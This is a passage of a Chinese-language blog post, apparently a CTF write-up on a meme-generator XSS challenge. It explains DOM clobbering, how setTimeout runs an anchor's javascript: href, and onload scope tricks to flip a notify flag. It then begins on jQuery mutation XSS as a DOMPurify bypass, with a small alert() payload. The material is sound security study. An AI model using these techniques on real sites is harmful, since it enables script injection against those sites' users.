class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (notify) {</span><br><span class="line">      html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">        text</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">      )}</span>&lt;/div&gt;`</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span><br><span class="line">      $(<span class="hljs-string">&quot;#status&quot;</span>).remove();</span><br><span class="line">      notify ? $(<span class="hljs-string">&quot;#notify&quot;</span>).html(html) : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">      $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(template);</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></table></figure><p>&#x7528;&#x6765;&#x8FDB;&#x884C; DOM &#x5143;&#x7D20;&#x64CD;&#x4F5C;&#x7B49;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5C31;&#x662F;<code>setTimeout</code>&#x51FD;&#x6570;&#x4E2D;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x628A; notify &#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; true&#x3002;</p><h3 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png" alt></p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;</p><blockquote><p>&#x200B;    The <strong><code>domain</code></strong> property of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">same origin policy</a>.</p></blockquote><p>&#x8FD9;&#x91CC;&#x7684;<code>document.domain</code>&#x5E76;&#x6CA1;&#x6709;&#x83B7;&#x53D6;&#x5230;&#x6211;&#x7684;&#x57DF;&#x540D;<code>zedd.vv</code>&#xFF0C;&#x53CD;&#x800C;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x4E86; img &#x6807;&#x7B7E;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8F93;&#x51FA; document &#x5BF9;&#x8C61;&#x6765;&#x770B;&#x770B;&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png" alt></p><p>&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;&#x7684; id(name) &#x5C5E;&#x6027;&#x6765;&#x63A7;&#x5236; document(window) &#x901A;&#x8FC7; DOM API(BOM API) &#x83B7;&#x53D6;&#x5230;&#x7684;&#x67D0;&#x4E2A;&#x4E1C;&#x897F;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png" alt></p><p>&#x6211;&#x67E5;&#x9605;&#x8FC7;&#x76F8;&#x5173;&#x8D44;&#x6599;&#xFF0C;&#x4E5F;&#x8BE2;&#x95EE;&#x8FC7;&#x4E00;&#x4E9B;&#x524D;&#x7AEF;&#x7684;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x6211;&#x7684;&#x89E3;&#x91CA;&#x662F;&#x201D;document &#x548C; window &#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x5176;&#x5B9E;&#x662F; DOM &#x548C; BOM &#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8FD9;&#x4E24;&#x4E2A;&#x4E0D;&#x5E94;&#x8BE5;&#x88AB;&#x5F53;&#x505A;&#x666E;&#x901A;&#x7684; JS &#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x89C4;&#x8303;&#x4E0E;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x201D;&#xFF0C;&#x201D;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x53E4;&#x9057;&#x7559;&#x95EE;&#x9898;&#xFF0C;&#x73B0;&#x5728;&#x54EA;&#x6709;&#x76F4;&#x63A5;&#x5199; document.xxx &#x6765;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x7684;&#xFF0C;TS &#x548C; eslint &#x90FD;&#x4F1A;&#x62A5;&#x9519;&#x201D;&#x3002;</p><p>&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">dom-clobbering</a>&#xFF0C;&#x4E0D;&#x7B97;&#x662F;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x624B;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x6548;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;&#x8FD9;&#x79CD; Trick &#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>&#x6211;&#x4EEC;&#x4E86;&#x89E3;&#x4E86; Dom Clobbering &#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x901A;&#x8FC7;<code>setTimeout</code>&#x6765;&#x5229;&#x7528;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    a.innerHTML = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;b&apos;</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E;&#x4EE5;&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; Dom Clobbering &#x6765;&#x5B9E;&#x73B0; XSS &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F20;&#x5165; id &#x4E3A; ok &#x7684;&#x6807;&#x7B7E;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F8B;&#x5982;&#x4F20;&#x5165;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ok</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;&#xFF0C;<code>setTimeout</code>&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#x6216;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53EF;&#x662F;&#x6839;&#x636E; Dom Clobbering &#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>ok</code>&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#xFF0C;&#x65E2;&#x7136;&#x8FD9;&#x4E0D;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5C31;&#x5C1D;&#x8BD5;&#x7528;<code>toString</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x800C;&#x6839;&#x636E; MDN &#x6587;&#x6863; <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p><blockquote><p>&#x200B;    <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener"><code>USVString</code></a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.href</code></a>, though it can&#x2019;t be used to modify the value.</p></blockquote><p>&#x800C;&#x5F53; a &#x6807;&#x7B7E;&#x901A;&#x8FC7;<code>toString()</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5B83;&#x7684; href &#x5C5E;&#x6027;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>javascript:alert()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684; notify &#x4E0A;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; DOM Clobbering &#x8FDB;&#x884C;&#x201C;&#x6C61;&#x67D3;&#x201D;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x9898;&#x76EE;&#x76F4;&#x63A5;&#x89C4;&#x5B9A;&#x4E86;<code>let notify = false</code>&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5F53;&#x7136;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x53EF;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x91CC;&#x7684; notify &#x6BD4;&#x8F83;&#x5177;&#x6709;&#x8BEF;&#x5BFC;&#x6027;&#xFF0C;&#x6BD4;&#x8F83;&#x50CF; C &#x8BED;&#x8A00;&#x5165;&#x95E8;&#x7684;&#x65F6;&#x5019;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">truetruetruetrueif (text &amp;&amp; img) {</span><br><span class="line">truetruetruetruetruetemplate = memeTemplate(img, text);</span><br><span class="line">truetruetruetruetrueif (notify) {</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-comment">//...</span></span></span><br><span class="line">truetruetruetruetrue}</span><br><span class="line">truetruetruetrue}</span><br><span class="line">truetruetrue};</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">      `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>` +</span></span></span><br><span class="line"><span class="hljs-actionscript">      `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(</span></span><br><span class="line">        img</span><br><span class="line"><span class="hljs-actionscript">      )}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;` +</span></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="hljs-actionscript">  } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;https://i.imgur.com/PdbDexI.jpg&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;When you get that WW3 draft letter&quot;</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x518D;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x5C31;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684; C &#x8BED;&#x8A00;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x7684;&#x7EC3;&#x4E60;&#x9898;&#x4E86;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, x</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (x) {</span><br><span class="line">    <span class="hljs-comment">//...</span></span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></table></figure><p>&#x4E3A;&#x4E86;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x6210;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x6613;&#x5F04;&#x6DF7;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x6765;&#x8BF4;&#xFF0C;<code>notify</code>&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x533A;&#x522B;&#x4E8E;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x7684; Javascript Scope &#x90E8;&#x5206;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5185;&#x7684;<code>notify</code>&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x53D6;&#x51B3;&#x4E8E;&#x8BE5;&#x51FD;&#x6570;&#x6240;&#x5728;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x3002;</p><p>&#x800C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5B83;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F;&#x5728;<code>let notify = false</code>&#x6240;&#x5904;&#x7684; JS &#x4EE3;&#x7801;&#x57DF;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x901A;&#x8FC7;<code>document.write</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4F5C;&#x7528;&#x57DF;&#x7684;&#x95EE;&#x9898;&#x3002;</p><h3 id="JavaScript-Scope"><a href="#JavaScript-Scope" class="headerlink" title="JavaScript Scope"></a>JavaScript Scope</h3><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x6267;&#x884C;<code>document.write</code>&#x51FD;&#x6570;&#x8FC7;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;<code>onload=memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F; JS &#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x672C;&#x6765;&#x8FD9;&#x4E48;&#x51E0;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF1A;window&#x3001;script&#x3001;onload&#xFF0C;&#x5176;&#x4E2D; window &#x5305;&#x542B;&#x4E86;&#x540E;&#x4E24;&#x4E2A;&#xFF0C;&#x540E;&#x4E24;&#x4E2A;&#x4E92;&#x4E0D;&#x5305;&#x542B;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5728; onload &#x627E;&#x4E0D;&#x5230; notify &#x53D8;&#x91CF;&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; window &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x627E;&#xFF0C;&#x5C31;&#x4F1A;&#x628A; script &#x4F5C;&#x7528;&#x57DF;&#x5F53;&#x4E2D;&#x7684; notify &#x7ED9;&#x627E;&#x5230;&#xFF0C;notify &#x53D8;&#x91CF;&#x4E5F;&#x5C31;&#x6210; false &#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x7406;&#x89E3;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">const</span> test = <span class="hljs-function">(<span class="hljs-params">that,x</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Test&apos;x: &quot;</span> + x);</span></span><br><span class="line">    if(x){</span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS Magic&quot;</span>);</span></span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> x = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS&apos;x: &quot;</span> + x);</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">  document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">test(this,x)</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png" alt></p><p>&#x539F;&#x7406;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;<code>test</code>&#x51FD;&#x6570;&#x5728;<code>onerror</code>&#x4F5C;&#x7528;&#x57DF;&#x627E;&#x5230;&#x4E86; x &#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4E0D;&#x4F1A;&#x518D;&#x53BB;&#x627E; window &#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684; <code>x=false</code>&#x53D8;&#x91CF;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x9898;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E00;&#x4E2A;<code>name=notify</code>&#x7684;&#x6807;&#x7B7E;&#x6765;&#x201C;&#x8986;&#x76D6;&#x201D;&#x6389;&#x539F;&#x6765;&#x7684; notify &#x53D8;&#x91CF;&#x3002;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E5F;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x4E00;&#x5904;&#x4E5F;&#x6BD4;&#x8F83;&#x795E;&#x5947;&#x5C31;&#x662F; text &amp; img</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></table></figure><p><code>memeGen</code>&#x51FD;&#x6570;&#x5728;&#x51FD;&#x6570;&#x5185;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;onload &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x4E5F;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; script&#x4E0B;&#x9762;&#x627E;&#xFF0C;&#x800C;&#x591A;&#x4E2A; script &#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x51FD;&#x6570;&#x5F53;&#x4E2D;&#x7684; text &#x4EE5;&#x53CA; img &#xFF0C;&#x5B83;&#x662F;&#x5728;&#x4E0B;&#x4E00;&#x5757; JS &#x4EE3;&#x7801;&#x6BB5;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  ...</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png" alt></p><h3 id="JQuery&#x2019;s-&#x2018;mXSS&#x2019;"><a href="#JQuery&#x2019;s-&#x2018;mXSS&#x2019;" class="headerlink" title="JQuery&#x2019;s &#x2018;mXSS&#x2019;"></a>JQuery&#x2019;s &#x2018;mXSS&#x2019;</h3><p>&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A; notify &#x7684;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F; DOM Purify &#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x8981;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x63D2;&#x5165;&#x7684;&#xFF0C;&#x800C;&#x53C2;&#x6570; html &#x53C8;&#x6765;&#x81EA;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(text)}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></table></figure><p>&#x7B80;&#x5355;&#x8DDF;&#x4E00;&#x4E0B; JQuery &#x7684; <code>html()</code> 